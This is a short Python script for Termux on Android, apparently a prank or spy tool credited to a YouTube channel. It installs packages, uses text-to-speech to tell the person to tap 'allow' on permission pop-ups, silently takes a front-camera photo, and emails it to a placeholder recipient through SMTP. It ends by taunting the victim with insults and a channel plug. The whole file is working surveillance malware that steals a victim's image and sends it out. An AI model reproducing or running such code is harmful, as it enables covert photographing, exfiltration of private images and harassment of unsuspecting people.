import os, sys
print('menginstall packet....')
os.system('termux-tts-speak sedang menginstall paket, mohon tunggu sebentar bangsat')
print('[jika ada pop-up, tab ajah ijinkan]')
os.system('termux-tts-speak jika ada pop ap, tab ajah ijinkan')
os.system('pip install yagmail')
os.system('pip install termcolor')

import yagmail
from termcolor import colored
print(colored('Paket berhasil di install bangsat','green'))
os.system('termux-tts-speak paket berhasil di install bangsat')

baner= """

  ___ __ _  ___ __ _  ___ _ __ __ _  ___| | __
 / __/ _` |/ __/ _` |/ __| '__/ _` |/ __| |/ /
| (_| (_| | (_| (_| | (__| | | (_| | (__|   <
 \___\__,_|\___\__,_|\___|_|  \__,_|\___|_|\_|
 Youtube : CACACRACK
 Instagram: jeager000
 Code by: jeager
 """
print(colored(baner,'green'))
jeager=yagmail.SMTP('email pengirim','password email pengirim')
subject='Photo target'
os.system('termux-camera-photo -c 1 /sdcard/jeager.png')
body='/sdcard/jeager.png'
jeager.send('email penerima',subject,body)
os.system('termux-tts-speak hahahha mampus, photo elu gua ambil nih bangsat, jangan lupa subcreb chanel cacacrack bangsat')
print(colored('Selesai...','red'))